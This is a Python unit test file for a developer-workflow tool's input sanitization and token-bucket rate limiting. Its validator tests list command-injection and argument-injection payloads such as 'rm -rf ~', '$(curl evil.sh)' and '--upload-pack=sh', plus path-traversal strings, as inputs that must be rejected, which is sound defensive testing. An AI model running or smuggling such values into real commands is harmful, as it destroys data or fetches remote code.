"""
Unit tests for the two best practices.

Run either way:
    pytest -q
    python tests/test_security_and_ratelimit.py      # no pytest needed
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from devworkflow import security                      # noqa: E402
from devworkflow.errors import RateLimitError, ValidationError  # noqa: E402
from devworkflow.ratelimit import TokenBucket         # noqa: E402


def expect_rejected(fn, *args, **kwargs) -> None:
    try:
        fn(*args, **kwargs)
    except ValidationError:
        return
    raise AssertionError(f"{fn.__name__}{args} should have been rejected")


# --- BEST PRACTICE #1: input sanitization ----------------------------------
def test_author_rejects_command_injection() -> None:
    for payload in ["Alice; rm -rf ~", "$(curl evil.sh)", "a | sh", "a && whoami",
                    "`id`", "a\nb", "a > /tmp/x"]:
        expect_rejected(security.validate_author, payload)


def test_author_rejects_argument_injection() -> None:
    for payload in ["--output=/tmp/x", "-n1", "--upload-pack=sh"]:
        expect_rejected(security.validate_author, payload)


def test_author_accepts_legitimate_values() -> None:
    assert security.validate_author("  Alice Dev  ") == "Alice Dev"
    assert security.validate_author("alice@example.com") == "alice@example.com"
    assert security.validate_author("") == ""


def test_repo_slug_rules() -> None:
    assert security.validate_repo_slug("octocat/Hello-World") == "octocat/Hello-World"
    for payload in ["octocat", "octocat/repo; rm -rf ~", "../../etc", "-x/y", ""]:
        expect_rejected(security.validate_repo_slug, payload)


def test_repo_allow_list_enforced() -> None:
    allowed = frozenset({"me/mine"})
    assert security.validate_repo_slug("me/mine", allowed) == "me/mine"
    expect_rejected(security.validate_repo_slug, "someone/else", allowed)


def test_max_count_bounds() -> None:
    assert security.validate_max_count(20) == 20
    for payload in [0, -5, 10_000_000, "abc"]:
        expect_rejected(security.validate_max_count, payload)


def test_title_and_body_limits() -> None:
    assert security.sanitize_issue_title("  spaced   out \n title ") == "spaced out title"
    expect_rejected(security.sanitize_issue_title, "")
    expect_rejected(security.sanitize_issue_title, "x" * 300)
    expect_rejected(security.sanitize_issue_body, "text\x00with-nul")
    expect_rejected(security.sanitize_issue_body, "y" * 9_000)


def test_labels() -> None:
    assert security.validate_labels(["bug", "needs-triage"]) == ["bug", "needs-triage"]
    expect_rejected(security.validate_labels, ["bad;label"])
    expect_rejected(security.validate_labels, [f"l{i}" for i in range(11)])


def test_path_confinement(tmp_path: Path | None = None) -> None:
    root = tmp_path or Path(__file__).resolve().parent / "_tmp_ws"
    root.mkdir(parents=True, exist_ok=True)
    inside = root / "repo"
    (inside / ".git").mkdir(parents=True, exist_ok=True)

    assert security.resolve_repo_path(str(inside), root) == inside.resolve()
    expect_rejected(security.resolve_repo_path, "/etc", root)
    expect_rejected(security.resolve_repo_path, f"{inside}/../../..", root)
    expect_rejected(security.resolve_repo_path, f"{inside}\x00/etc", root)
    # A directory inside the root that is not a repo is still refused.
    (root / "notarepo").mkdir(exist_ok=True)
    expect_rejected(security.resolve_repo_path, str(root / "notarepo"), root)


# --- BEST PRACTICE #2: rate limiting ---------------------------------------
def test_bucket_allows_capacity_then_refuses() -> None:
    bucket = TokenBucket(capacity=3, window_seconds=60, name="t")
    assert [bucket.try_consume()[0] for _ in range(3)] == [True, True, True]
    allowed, retry_after = bucket.try_consume()
    assert allowed is False
    assert 0 < retry_after <= 20.1


def test_bucket_raises_with_retry_hint() -> None:
    bucket = TokenBucket(capacity=1, window_seconds=10, name="t")
    bucket.consume_or_raise()
    try:
        bucket.consume_or_raise()
    except RateLimitError as exc:
        assert exc.retry_after_seconds > 0
        assert "Rate limit reached" in str(exc)
        return
    raise AssertionError("second call should have raised RateLimitError")


def test_bucket_refills_over_time() -> None:
    bucket = TokenBucket(capacity=2, window_seconds=1.0, name="t")   # 2 tokens/sec
    bucket.try_consume(); bucket.try_consume()
    assert bucket.try_consume()[0] is False
    time.sleep(0.6)
    assert bucket.try_consume()[0] is True


def test_bucket_never_exceeds_capacity() -> None:
    bucket = TokenBucket(capacity=2, window_seconds=0.2, name="t")
    time.sleep(0.5)                       # would over-refill an unclamped bucket
    assert bucket.peek().tokens == 2.0


def test_bucket_is_thread_safe() -> None:
    import threading
    bucket = TokenBucket(capacity=50, window_seconds=600, name="t")
    granted: list[bool] = []
    lock = threading.Lock()

    def worker() -> None:
        allowed, _ = bucket.try_consume()
        with lock:
            granted.append(allowed)

    threads = [threading.Thread(target=worker) for _ in range(200)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert sum(granted) == 50      # exactly capacity, no more, despite the race


if __name__ == "__main__":
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    failures = 0
    for test in tests:
        try:
            test()
            print(f"  PASS  {test.__name__}")
        except Exception as exc:                       # noqa: BLE001
            failures += 1
            print(f"  FAIL  {test.__name__}: {exc}")
    print(f"\n{len(tests) - failures}/{len(tests)} tests passed")
    raise SystemExit(1 if failures else 0)
